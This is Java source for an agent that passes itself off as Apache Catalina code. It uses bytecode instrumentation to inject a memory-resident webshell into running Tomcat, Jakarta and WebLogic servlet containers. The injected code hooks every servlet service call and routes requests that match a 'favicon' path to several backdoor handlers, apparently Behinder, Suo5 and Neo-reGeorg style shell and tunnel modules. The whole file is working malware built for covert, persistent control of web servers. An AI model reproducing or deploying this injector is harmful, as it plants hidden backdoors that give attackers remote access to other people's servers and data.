package org.apache.catalina.servlets;

import org.apache.catalina.servlets.utils.ServerDetector;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
import java.util.*;

public class AgentMain {
    public static String shellCode = "" +
            "javax.servlet.http.HttpServletRequest request=(javax.servlet.http.HttpServletRequest)$1;\n" +
            "javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)$2;\n" +
            "javax.servlet.http.HttpSession session = request.getSession();\n" +
            "String url = request.getServletPath();\n" +
            "String method = request.getMethod();\n" +
            "java.util.Map obj=new java.util.HashMap();\n" +
            "obj.put(\"request\",request);\n" +
            "obj.put(\"response\",response);\n" +
            "obj.put(\"session\",session);\n" +
            "java.io.InputStream in=request.getInputStream();\n" +
            "if (url.matches(\"/(.*)favicon(.*)\")) {"+
            "try{\n" +
            "org.apache.catalina.servlets.sl.C.doService(obj,url,method,in);\n"+
            "org.apache.catalina.servlets.sl.JS.doService(obj,url,method,in);\n"+
            "org.apache.catalina.servlets.sl.BX.doService(obj,url,method,in);\n"+
            "org.apache.catalina.servlets.sl.Suo5.doService(obj,url,method,in);\n"+
            "org.apache.catalina.servlets.sl.Neo.doService(obj,url,method,in);\n"+
            "org.apache.catalina.servlets.sl.WS.doService(obj,url,method,in);\n"+
            "return;\n"+
            "}catch(Exception ignored){}}\n";


    public static void agentmain(String agentArgs, Instrumentation ins) {
        System.out.println("agentmain");
        Class[] cLasses = ins.getAllLoadedClasses();
        Map targetClasses = targetClasses();
        for (Class cls : cLasses) {
            if (targetClasses.containsKey(cls.getName())) {
                String targetClassName = cls.getName();
                try {
                    byte[] data = getbyte(targetClassName,targetClasses,cls);
                    ins.redefineClasses(new ClassDefinition(cls, data));
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }

    public static void premain(String agentArgs, Instrumentation inst) {
        System.out.println("premain");
        inst.addTransformer(new DefineTransformer(), true);
    }

    static class DefineTransformer implements ClassFileTransformer {
        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
            Map targetClasses = targetClasses();
            if (targetClasses.containsKey(className.replace("/", "."))) {
                try {
                    return getbyte(className, targetClasses, classBeingRedefined);
                } catch (Exception ignored) {
                }
            }
            return classfileBuffer;
        }
    }

    public static byte[] getbyte(String targetClassName,Map targetClasses,Class cls) throws Exception{
        ClassPool cPool = ClassPool.getDefault();
        if (targetClassName.equals("jakarta.servlet.http.HttpServlet")) {
            shellCode = shellCode.replace("javax.servlet", "jakarta.servlet");
        }
        ClassClassPath classPath = new ClassClassPath(cls);
        cPool.insertClassPath(classPath);
        List paramClsList = new ArrayList();
        Iterator var17 = ((List) ((Map) targetClasses.get(targetClassName)).get("paramList")).iterator();
        String methodName;
        while (var17.hasNext()) {
            methodName = (String) var17.next();
            paramClsList.add(cPool.get(methodName));
        }
        CtClass cClass = cPool.get(targetClassName);
        methodName = ((Map) targetClasses.get(targetClassName)).get("methodName").toString();
        CtMethod cMethod = cClass.getDeclaredMethod(methodName, (CtClass[]) paramClsList.toArray(new CtClass[paramClsList.size()]));
        cMethod.insertBefore(shellCode);
        cClass.detach();
        return cClass.toBytecode();
    }

    public static Map targetClasses() {
        Map targetClasses = new HashMap();
        Map targetClassJavaxMap = new HashMap();
        targetClassJavaxMap.put("methodName", "service");
        List paramJavaxClsStrList = new ArrayList();
        paramJavaxClsStrList.add("javax.servlet.ServletRequest");
        paramJavaxClsStrList.add("javax.servlet.ServletResponse");
        targetClassJavaxMap.put("paramList", paramJavaxClsStrList);
        targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
        Map targetClassJakartaMap = new HashMap();
        targetClassJakartaMap.put("methodName", "service");
        List paramJakartaClsStrList = new ArrayList();
        paramJakartaClsStrList.add("jakarta.servlet.ServletRequest");
        paramJakartaClsStrList.add("jakarta.servlet.ServletResponse");
        targetClassJakartaMap.put("paramList", paramJakartaClsStrList);
        targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
        targetClasses.put("jakarta.servlet.http.HttpServlet", targetClassJakartaMap);
        if (ServerDetector.isWebLogic()) {
            targetClasses.clear();
            Map targetClassWeblogicMap = new HashMap();
            targetClassWeblogicMap.put("methodName", "execute");
            List paramWeblogicClsStrList = new ArrayList();
            paramWeblogicClsStrList.add("javax.servlet.ServletRequest");
            paramWeblogicClsStrList.add("javax.servlet.ServletResponse");
            targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
            targetClasses.put("weblogic.servlet.internal.ServletStubImpl", targetClassWeblogicMap);
        }
        return targetClasses;
    }
}